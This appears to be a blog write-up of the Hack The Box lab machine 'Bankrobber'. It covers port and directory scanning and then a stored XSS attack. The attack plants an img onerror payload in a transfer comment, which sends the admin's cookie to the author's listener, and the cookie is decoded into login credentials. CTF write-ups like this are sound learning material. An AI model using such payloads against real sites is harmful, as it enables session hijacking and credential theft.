---
permalink: /posts/HTB/Bankrobber
layout: post
author: Vlad
title:  "Bankrobber "
tags: HTB Windows SQLi
---
# Bankrobber - 10.10.10.154
![InfoCard](/assets/images/HTB/Bankrobber/InfoCard.jpg)

## Enumeration

For an initial scan I used the following nmap command 
```
nmap -sV -sT -sC -p- -o nmapinitial -T4 10.10.10.154
```
The nmap scan finds the following opened ports 80, 443, 445, and 3306.
Port 3306 appears to be filtering by IP.
![nmapinitial](/assets/images/HTB/Bankrobber/nmapinitial.jpg)

enum4linux didn't return anything that i could use further.

## Website

At a first glance, it looks like the site is a cryptocurrency exchange.
![website1](/assets/images/HTB/Bankrobber/website1.jpg)

I started dirb with its default wordlist to see if it can find anything that might be of interest for later use.
```
dirb http://10.10.10.154/ -A -i -X html,,txt,xml,php -z 10 -o dirbout.txt
```

While dirb was running, i continued poking around the website to see what I can find.

### Testing site registration

Accessing the Register page, I'm presented with a registration form which I use to create an account.
![registeronsite](/assets/images/HTB/Bankrobber/registeronsite.jpg)

And, once logged in with the newly created user account, I can access the E-coin transfer form.
I initiate a transfer to see what happens.
![transfercointest](/assets/images/HTB/Bankrobber/transfercointest.jpg)

Judging by this message it looks like the site's admin or, more likely, a job running as the site's admin is 
periodically checking and approving transfers. This indicates that a client-side attack could be used to steal the admin's cookie.

##Initial foothold
I start an ncat listener on port 80 and create an E-coin transfer with the following payload added in the comment section
```
<img src=x onerror=this.src="http://10.10.14.51/?c="%2bdocument.cookie>
```
![transferpayload](/assets/images/HTB/Bankrobber/transferpayload.jpg)

This is how the request looks in Burp.
![burp_](/assets/images/HTB/Bankrobber/burp_.jpg)

In Burp i can see that my cookie contains my user ID, as well as my BASE64 encoded username and password.
The request also references my user ID in fromID.
The lsitener I've started earlier catches the admin cookie within a couple of minutes.
![admcookie](/assets/images/HTB/Bankrobber/admcookie.jpg)

Decoding from BASE64 using [base64decode.org](https://www.base64decode.org/) reveales the following admin credentials:
- YWRtaW4% = admin
- SG9wZWxlc3Nyb21hbnRpYw%3D%3D = Hopelessromantic

Logging in as admin leads me to this page
